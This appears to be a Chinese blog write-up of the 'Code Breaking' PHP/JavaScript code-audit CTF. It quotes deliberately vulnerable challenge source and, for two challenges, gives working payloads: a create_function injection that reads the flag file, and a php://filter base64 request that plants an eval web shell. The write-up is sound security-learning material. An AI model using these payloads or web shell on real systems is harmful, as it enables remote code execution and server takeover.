---
title: Code Breaking Writeup
date: 2018-12-30 12:34:38
tags:
- 代码审计
- Writeup
abstract: 
phith0n 在代码审计知识星球两周年时发起的审计游戏。
圈子内容质量很高，欢迎加入一起学习~
---

## 1.easy - function

> PHP 函数利用技巧

```php
<?php
$action = $_GET['action'] ?? '';
$arg = $_GET['arg'] ?? '';

if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
    show_source(__FILE__);
} else {
    $action('', $arg);
}
```

环境：

- Apache 2.4.25
- PHP 7.2.12

仔细看一下 `isD` 模式修饰符

```
i  ==>  忽略大小写
s  ==>  点号匹配所有字符，包含换行符，未设置则不匹配换行符
D  ==>  模式中的 $ 仅仅匹配目标字符串的末尾
```

总的来说，`action` 中不能全是字母、数字以及下划线。为了不影响 `create_function` 调用，只能在前面或者后面插入一个无法被正则匹配到的字符，直接 fuzz 一波 ASCII 码，从 `%00 ~ %ff` 可得到 %5c 即 `\`。

先试一下 `phpinfo`

```php
%5ccreate_function&arg=}phpinfo();//
```

![]()

然后找 `flag`，`system()` 被禁掉了，直接用 php 的文件操作函数

```php
/?action=\create_function&arg=}print_r(scandir(dirname(__FILE__)."/../"));//

var_dump(glob("/var/www/*"));  // 也可以
```

Array (
    [0] => .
    [1] => ..
    [2] => flag_h0w2execute_arb1trary_c0de
    [3] => html
)

```php
&arg=}print_r(file_get_contents('../flag_h0w2execute_arb1trary_c0de'));//
```



## 2.easy - pcrewaf

> PHP 正则特性

```php
<?php
function is_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
} 1
```



## 3.easy - phpmagic

> PHP 写文件技巧

```php
<?php
if(isset($_GET['read-source'])) {
    exit(show_source(__FILE__));
}

define('DATA_DIR', dirname(__FILE__) . '/data/' . md5($_SERVER['REMOTE_ADDR']));

if(!is_dir(DATA_DIR)) {
    mkdir(DATA_DIR, 0755, true);
}

chdir(DATA_DIR);  // 改变当前目录为 DATA_DIR

$domain = isset($_POST['domain']) ? $_POST['domain'] : '';
$log_name = isset($_POST['log']) ? $_POST['log'] : date('-Y-m-d');
?>

<?php 
if(!empty($_POST) && $domain):
    $command = sprintf("dig -t A -q %s", escapeshellarg($domain));
    $output = shell_exec($command);
    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);

    $log_name = $_SERVER['SERVER_NAME'] . $log_name;
    if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), 
      ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) {
        file_put_contents($log_name, $output);
    }
    echo $output;
endif; 
?>
```

注意到有个 `escapeshellarg($domain)`，功能如下： 

1.确保用户只传递一个参数给命令
2.用户不能指定更多的参数一个
3.用户不能执行不同的命令

[利用/绕过 PHP escapeshellarg/escapeshellcmd函数](https://www.anquanke.com/post/id/107336)

`htmlspecialchars()`

- ENT_HTML401 - 默认。作为 HTML 4.01 处理代码。

- ENT_QUOTES - 编码双引号和单引号。

对于前头这些字符串

```
; &lt;&lt;&gt;&gt; DiG 9.9.5-9+deb8u15-Debian &lt;&lt;&gt;&gt; -t A -q
```

符合base64规范的字符是：

```
ltltgtgtDiG9959deb8u15DebianltltgtgttAq 
```

恰好是40位，为4的倍数，就不用管这个，只需要添加我们的字符串。因为插入的字符在中间，所以不能有 `=`

```php
POST / HTTP/1.1
Host: php
Upgrade-Insecure-Requests: 1

domain=PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg&log=://filter/write=convert.base64-decode/resource=shell.php/.
```

成功写入一句话

```php
<?php eval($_GET['c']);?>
```



## 4.easy - phplimit

> PHP 代码执行限制绕过

```php
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {   
    eval($_GET['code']);
} else {
    show_source(__FILE__);
}
```



## 5.easy - nodechr

> JavaScript 字符串特性

```javascript
// initial libraries
const Koa = require('koa')
const sqlite = require('sqlite')
const fs = require('fs')
const views = require('koa-views')
const Router = require('koa-router')
const send = require('koa-send')
const bodyParser = require('koa-bodyparser')
const session = require('koa-session')
const isString = require('underscore').isString
const basename = require('path').basename

const config = JSON.parse(fs.readFileSync('../config.json', {encoding: 'utf-8', flag: 'r'}))

async function main() {
    const app = new Koa()
    const router = new Router()
    const db = await sqlite.open(':memory:')

    await db.exec(`CREATE TABLE "main"."users" (
        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
        "username" TEXT NOT NULL,
        "password" TEXT,
        CONSTRAINT "unique_username" UNIQUE ("username")
    )`)
    await db.exec(`CREATE TABLE "main"."flags" (
        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
        "flag" TEXT NOT NULL
    )`)
    for (let user of config.users) {
        await db.run(`INSERT INTO "users"("username", "password") VALUES ('${user.username}', '${user.password}')`)
    }
    await db.run(`INSERT INTO "flags"("flag") VALUES ('${config.flag}')`)

    router.all('login', '/login/', login).get('admin', '/', admin).get('static', '/static/:path(.+)', static).get('/source', source)

    app.use(views(__dirname + '/views', {
        map: {
            html: 'underscore'
        },
        extension: 'html'
    })).use(bodyParser()).use(session(app))
    
    app.use(router.routes()).use(router.allowedMethods());
    
    app.keys = config.signed
    app.context.db = db
    app.context.router = router
    app.listen(3000)
}

function safeKeyword(keyword) {
    if(isString(keyword) && !keyword.match(/(union|select|;|\-\-)/is)) {
        return keyword
    }

    return undefined
}

async function login(ctx, next) {
    if(ctx.method == 'POST') {
        let username = safeKeyword(ctx.request.body['username'])
        let password = safeKeyword(ctx.request.body['password'])

        let jump = ctx.router.url('login')
        if (username && password) {
            let user = await ctx.db.get(`SELECT * FROM "users" WHERE "username" = '${username.toUpperCase()}' AND "password" = '${password.toUpperCase()}'`)

            if (user) {
                ctx.session.user = user

                jump = ctx.router.url('admin')
            }

        }

        ctx.status = 303
        ctx.redirect(jump)
    } else {
        await ctx.render('index')
    }
}

async function static(ctx, next) {
    await send(ctx, ctx.path)
}

async function admin(ctx, next) {
    if(!ctx.session.user) {
        ctx.status = 303
        return ctx.redirect(ctx.router.url('login'))
    }

    await ctx.render('admin', {
        'user': ctx.session.user
    })
}

async function source(ctx, next) {
    await send(ctx, basename(__filename))
}

main()
```



## 6.medium - javacon

> SPEL 表达式沙盒绕过

## 7.medium - lumenserial

> 反序列化在 7.2 下的利用

## 8.hard - picklecode

> Python 反序列化沙盒绕过

## 9.hard - thejs

> JavaScript 对象特性利用